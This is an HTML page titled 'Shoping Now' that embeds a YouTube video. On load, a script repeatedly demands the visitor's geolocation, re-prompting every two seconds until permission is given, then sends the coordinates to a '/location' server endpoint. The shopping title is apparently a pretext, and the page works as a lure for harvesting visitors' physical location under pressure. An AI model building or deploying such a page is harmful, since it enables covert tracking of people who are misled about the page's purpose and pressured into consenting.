<!DOCTYPE html>
<html>
<head>
  <title>Shoping Now</title>
  <style>
    html, body { margin: 0; padding: 0; height: 100%; overflow: hidden; }
    /* iframe { width: 100vw; height: 100vh; border: none; } */
  </style>
</head>
<body>
  <!-- Replace VIDEO_ID with real YouTube ID -->
  <!-- <iframe src="https://www.youtube.com/embed/II2EO3Nw4m0?autoplay=1&mute=1&controls=0&showinfo=0&loop=1&playlist=VIDEO_ID"></iframe> -->
  <!-- <iframe width="560" height="315" src="https://www.youtube.com/embed/II2EO3Nw4m0?si=9BaGNUy8-hZMkWA9" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe> -->
  <iframe width="560" height="315" src="https://www.youtube.com/embed/YZAFd9o3RYQ?si=VxpMZck8rrJSAGYT" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
  <script>
    async function askLocation() {
      let granted = false;
  
      while (!granted) {
        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject);
          });
  
          const { latitude, longitude } = position.coords;
          console.log("ðŸ“ Location fetched:", latitude, longitude);
          alert(`ðŸ“ Location fetched: Lat ${latitude}, Long ${longitude}`);
          granted = true;
  
          const res = await fetch("/location", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({ latitude, longitude })
          });
  
          const result = await res.json();
          alert(result.message || result.error);
          console.log("ðŸ“¤ Server response:", result);
        } catch (err) {
          console.warn("âš ï¸ Location access denied:", err);
          alert("âš ï¸ Please allow location access to continue.");
          await new Promise(resolve => setTimeout(resolve, 2000));
        }
      }
    }
  
    // Trigger on page load
    window.onload = askLocation;
  </script>
  
  

</body>
</html>
